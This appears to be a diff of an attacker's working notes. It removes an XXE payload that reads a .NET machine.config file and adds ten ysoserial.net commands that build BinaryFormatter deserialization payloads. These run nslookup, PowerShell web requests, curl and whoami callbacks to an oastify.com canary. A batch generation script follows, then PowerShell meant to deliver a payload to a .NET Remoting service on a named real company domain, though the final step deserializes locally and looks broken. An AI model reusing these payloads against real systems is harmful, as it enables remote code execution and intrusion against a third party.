@@ -1,4 +1,54 @@
-<!ENTITY % file SYSTEM "file:///C:/Windows/Microsoft.NET/Framework64/v4.0.30319/Config/machine.config"">
-<!ENTITY % eval "<!ENTITY &#x25; ssrf SYSTEM 'http://127.0.0.1:80/?data=%file;'>">
-%eval;
-%ssrf;
+Single-line ysoserial.net payload commands:
+
+
+# PAYLOAD 1: ObjectDataProvider + DNS callback (base64)
+ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > C:\payload_objectdata_dns.txt
+
+# PAYLOAD 2: ObjectDataProvider + HTTP callback (base64)
+ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "powershell.exe -c Invoke-WebRequest http://fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > C:\payload_objectdata_http.txt
+
+# PAYLOAD 3: WindowsIdentity gadget + DNS (base64)
+ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > C:\payload_windowsid_dns.txt
+
+# PAYLOAD 4: ActivitySurrogateSelector + cmd (base64)
+ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -o base64 -c "cmd.exe /c nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > C:\payload_activity_dns.txt
+
+# PAYLOAD 5: ObjectDataProvider + cert download (base64)
+ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "certutil.exe -ping fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > C:\payload_objectdata_cert.txt
+
+# PAYLOAD 6: ObjectDataProvider + raw hex format (for binary sending)
+ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o hex -c "nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > C:\payload_objectdata_hex.txt
+
+# PAYLOAD 7: TextFormattingRunProperties gadget + DNS (base64)
+ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c "nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > C:\payload_textformat_dns.txt
+
+# PAYLOAD 8: ObjectDataProvider + PowerShell reverse DNS (base64)
+ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "powershell.exe -c [System.Net.Dns]::GetHostAddresses('fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com')" > C:\payload_objectdata_psdns.txt
+
+# PAYLOAD 9: ObjectDataProvider + whoami to canary (base64)
+ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "cmd.exe /c whoami | nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > C:\payload_objectdata_whoami.txt
+
+# PAYLOAD 10: ObjectDataProvider + curl/wget to canary (base64)
+ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "powershell.exe -c curl http://fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com/rce" > C:\payload_objectdata_curl.txt
+Quick execution script (copy all at once):
+
+
+$canary = "fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com"
+ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "nslookup $canary" > payload1.txt; ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "powershell.exe -c Invoke-WebRequest http://$canary" > payload2.txt; ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "nslookup $canary" > payload3.txt; ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -o base64 -c "cmd.exe /c nslookup $canary" > payload4.txt; Write-Host "✅ All 4 payloads generated" -ForegroundColor Green
+For sending payload to remoting endpoint (after you have port):
+
+Once you know the port from app.config, use:
+
+
+# Read payload and send to AppFactoryService
+$payload = Get-Content C:\payload_objectdata_dns.txt
+$targetHost = "superderivatives.com"
+$targetPort = [PORT_FROM_CONFIG]
+$targetUri = "tcp://$targetHost`:$targetPort/AppFactoryService"
+
+# Send via .NET Remoting
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12
+$fmt = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+$stream = New-Object System.IO.MemoryStream([Convert]::FromBase64String($payload))
+$fmt.Deserialize($stream)
+
